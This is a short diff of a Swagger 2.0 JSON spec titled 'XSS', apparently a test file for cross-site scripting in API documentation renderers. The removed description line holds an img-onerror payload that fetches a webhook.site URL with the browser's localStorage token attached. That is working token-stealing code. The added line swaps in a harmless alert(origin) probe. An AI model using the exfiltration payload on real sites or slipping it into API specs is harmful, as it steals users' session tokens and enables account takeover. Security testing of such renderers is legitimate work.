@@ -2,7 +2,7 @@
   "swagger": "2.0",
   "info": {
     "title": "XSS",
-    "description": "<img src=x onerror=fetch('https://webhook.site/#!/view/98eb8895-b686-4b16-b2d8-694fd8a25f03/?t='+localStorage.getItem('token'))>"
+    "description": "<img src=x onerror=alert(origin)>"
   },
   "paths": {}
 }
